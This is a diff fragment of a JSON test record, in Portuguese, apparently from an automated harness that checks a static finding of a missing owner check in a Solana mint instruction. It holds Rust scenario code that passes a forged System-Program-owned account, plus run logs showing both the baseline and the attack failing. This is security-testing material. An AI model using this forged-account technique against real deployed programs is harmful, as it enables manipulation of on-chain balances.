+      "raw": "{\"plan\": \"O baseline falhou porque a conta ledger precisa ter pelo menos 56 bytes e ser gravavel, mas o erro ProgramFailedToComplete sugere que o programa tentou ler data[40..56] e a conta pode ter sido passada com tamanho insuficiente ou o owner/lamports causaram falha. Vou montar a conta ledger com 64 bytes, dono = program_id, e passar como writable. O ataque usa a mesma instrucao com uma conta forjada cujo owner e o System Program (diferente do programa), contendo os mesmos bytes iniciais. O efeito mede se o supply/balance da conta forjada foram incrementados pelo programa, o que so ocorre se a verificacao de owner estiver ausente.\", \"scenario\": \"let program_id = env.program_id;\\n\\n// Conta ledger legitima: dono = program_id, 64 bytes, supply=100, balance=50.\\nlet mut legit_data = vec![0u8; 64];\\nlegit_data[40..48].copy_from_slice(&100u64.to_le_bytes());\\nlegit_data[48..56].copy_from_slice(&50u64.to_le_bytes());\\nlet legit_ledger = account(&program_id, &legit_data, None);\\n\\n// Conta forjada pelo atacante: dono = System Program, mesmos bytes iniciais.\\nlet mut forged_data = vec![0u8; 64];\\nforged_data[40..48].copy_from_slice(&100u64.to_le_bytes());\\nforged_data[48..56].copy_from_slice(&50u64.to_le_bytes());\\nlet forged_ledger = account(&solana_sdk::system_program::id(), &forged_data, None);\\n\\nlet amount: u64 = 7;\\nlet mut ix_data = vec![0u8]; // IX_MINT\\nix_data.extend_from_slice(&amount.to_le_bytes());\\n\\n// Baseline: uso legitimo com a conta do programa (writable).\\nlet ix_legit = env.raw_ix(&ix_data, vec![AccountMeta::new(program_id, false)]);\\nlet contas_legit = vec![(program_id, legit_ledger.clone())];\\nlet r_base = env.baseline(\\\"mint legitimo na conta do programa\\\", &ix_legit, &contas_legit);\\n\\n// Ataque: mesma instrucao, mas accounts[0] e a conta forjada (owner diferente).\\nlet ix_attack = env.raw_ix(&ix_data, vec![AccountMeta::new(solana_sdk::system_program::id(), false)]);\\nlet contas_attack = vec![(solana_sdk::system_program::id(), forged_ledger.clone())];\\nlet r = env.attack(\\\"mint em conta forjada com owner do atacante\\\", &ix_attack, &contas_attack);\\n\\nif r.program_result == ProgramResult::Success {\\n    let d = after(&r, &solana_sdk::system_program::id()).data();\\n    let supply = read_u64(d, 40);\\n    let balance = read_u64(d, 48);\\n    env.effect(\\\"supply da conta forjada foi incrementado pelo programa\\\", supply == 107);\\n    env.effect(\\\"balance da conta forjada foi incrementado pelo programa\\\", balance == 57);\\n}\"}",
+      "plan": "O baseline falhou porque a conta ledger precisa ter pelo menos 56 bytes e ser gravavel, mas o erro ProgramFailedToComplete sugere que o programa tentou ler data[40..56] e a conta pode ter sido passada com tamanho insuficiente ou o owner/lamports causaram falha. Vou montar a conta ledger com 64 bytes, dono = program_id, e passar como writable. O ataque usa a mesma instrucao com uma conta forjada cujo owner e o System Program (diferente do programa), contendo os mesmos bytes iniciais. O efeito mede se o supply/balance da conta forjada foram incrementados pelo programa, o que so ocorre se a verificacao de owner estiver ausente.",
+      "scenario": "let program_id = env.program_id;\n\n// Conta ledger legitima: dono = program_id, 64 bytes, supply=100, balance=50.\nlet mut legit_data = vec![0u8; 64];\nlegit_data[40..48].copy_from_slice(&100u64.to_le_bytes());\nlegit_data[48..56].copy_from_slice(&50u64.to_le_bytes());\nlet legit_ledger = account(&program_id, &legit_data, None);\n\n// Conta forjada pelo atacante: dono = System Program, mesmos bytes iniciais.\nlet mut forged_data = vec![0u8; 64];\nforged_data[40..48].copy_from_slice(&100u64.to_le_bytes());\nforged_data[48..56].copy_from_slice(&50u64.to_le_bytes());\nlet forged_ledger = account(&solana_sdk::system_program::id(), &forged_data, None);\n\nlet amount: u64 = 7;\nlet mut ix_data = vec![0u8]; // IX_MINT\nix_data.extend_from_slice(&amount.to_le_bytes());\n\n// Baseline: uso legitimo com a conta do programa (writable).\nlet ix_legit = env.raw_ix(&ix_data, vec![AccountMeta::new(program_id, false)]);\nlet contas_legit = vec![(program_id, legit_ledger.clone())];\nlet r_base = env.baseline(\"mint legitimo na conta do programa\", &ix_legit, &contas_legit);\n\n// Ataque: mesma instrucao, mas accounts[0] e a conta forjada (owner diferente).\nlet ix_attack = env.raw_ix(&ix_data, vec![AccountMeta::new(solana_sdk::system_program::id(), false)]);\nlet contas_attack = vec![(solana_sdk::system_program::id(), forged_ledger.clone())];\nlet r = env.attack(\"mint em conta forjada com owner do atacante\", &ix_attack, &contas_attack);\n\nif r.program_result == ProgramResult::Success {\n    let d = after(&r, &solana_sdk::system_program::id()).data();\n    let supply = read_u64(d, 40);\n    let balance = read_u64(d, 48);\n    env.effect(\"supply da conta forjada foi incrementado pelo programa\", supply == 107);\n    env.effect(\"balance da conta forjada foi incrementado pelo programa\", balance == 57);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "mint legitimo na conta do programa",
+            "result": "UnknownError(ProgramFailedToComplete)",
+            "compute_units": 344,
+            "account_flags": "-w",
+            "ix_head": "0007000000000000",
+            "accounts": [
+              {
+                "key": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 64,
+                "head": "0000000000000000",
+                "digest": "150884c282a7e966",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "mint em conta forjada com owner do atacante",
+            "result": "UnknownError(ExternalAccountDataModified)",
+            "compute_units": 104,
+            "account_flags": "-w",
+            "ix_head": "0007000000000000",
+            "accounts": [
+              {
+                "key": "11111111111111111111111111111111",
+                "signer": false,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 64,
+                "head": "0000000000000000",
+                "digest": "150884c282a7e966",
+                "post": "00000000000000000000000000000000000000000000000000000000000000000000000000000000640000000000000032000000000000000000000000000000"
+              }
+            ]
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 344 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: SBF program panicked",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 104 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: instruction modified data of an account it does not own"
+        ],
+        "elapsed_s": 1.7
+      },
+      "verdict": null,
+      "reason": "o baseline 'mint legitimo na conta do programa' falhou com UnknownError(ProgramFailedToComplete); o uso legitimo precisa ter sucesso (revise layout das contas, seeds, flags de assinatura/escrita e argumentos)"
+    }
+  ],
+  "case_id": "SSP-03-P-V1",
+  "static_finding": {
+    "category": "OWNER",
+    "confidence": "high",
+    "evidence": "let ledger = &accounts[0];\n\nlet mut data = ledger.try_borrow_mut_data()?;",
+    "explanation": "A conta `ledger` e recebida como `AccountInfo` generica e seus dados sao lidos e modificados sem qualquer verificacao de que `ledger.owner` pertence ao programa esperado. Um atacante pode fornecer uma conta arbitraria cujos dados ele controla.",
+    "attack_hypothesis": "O atacante fornece como `accounts[0]` uma conta cujo owner nao e o programa (por exemplo, uma conta que ele mesmo possui) contendo bytes forjados nas posicoes 40..56, fazendo com que a instrucao `mint` incremente supply/balance de uma conta forjada e corrompa estado arbitrario."
+  }
+}
